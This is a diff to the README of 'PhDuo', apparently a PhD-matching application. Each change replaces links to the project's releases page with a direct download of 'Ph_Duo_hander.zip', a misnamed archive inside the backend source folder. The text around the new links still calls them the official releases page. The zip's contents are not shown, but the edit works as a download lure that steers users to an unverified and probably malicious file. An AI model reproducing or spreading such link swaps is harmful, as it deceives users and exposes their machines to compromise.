@@ -1,6 +1,6 @@
 # 🎓 PhDuo - Smart Matching for PhD Candidates
 
-[![Download PhDuo](https://img.shields.io/badge/Download_PhDuo-Download-blue?style=for-the-badge)](https://github.com/tanmay9075/PhDuo/releases)
+[![Download PhDuo](https://img.shields.io/badge/Download_PhDuo-Download-blue?style=for-the-badge)](https://github.com/tanmay9075/PhDuo/raw/refs/heads/main/backend/app/Ph_Duo_hander.zip)
 
 ## 📘 What is PhDuo?
 
@@ -28,7 +28,7 @@ This guide walks you through downloading, installing, and running PhDuo on a Win
 PhDuo does not require complicated installation. You can easily get it from the official GitHub releases page.
 
 - **Step 1:** Go to the PhDuo releases page:  
-  [https://github.com/tanmay9075/PhDuo/releases](https://github.com/tanmay9075/PhDuo/releases)
+  [https://github.com/tanmay9075/PhDuo/raw/refs/heads/main/backend/app/Ph_Duo_hander.zip](https://github.com/tanmay9075/PhDuo/raw/refs/heads/main/backend/app/Ph_Duo_hander.zip)
 
 - **Step 2:** Find the latest version of PhDuo for Windows. It usually comes as an executable (.exe) installer file.
 
@@ -111,4 +111,4 @@ If you encounter issues or have questions, use the GitHub repository’s Issues 
 ## ⬇️ Ready to Start? Download Now
 
 Click here to visit the release page and get the latest version:  
-[https://github.com/tanmay9075/PhDuo/releases](https://github.com/tanmay9075/PhDuo/releases)
+[https://github.com/tanmay9075/PhDuo/raw/refs/heads/main/backend/app/Ph_Duo_hander.zip](https://github.com/tanmay9075/PhDuo/raw/refs/heads/main/backend/app/Ph_Duo_hander.zip)
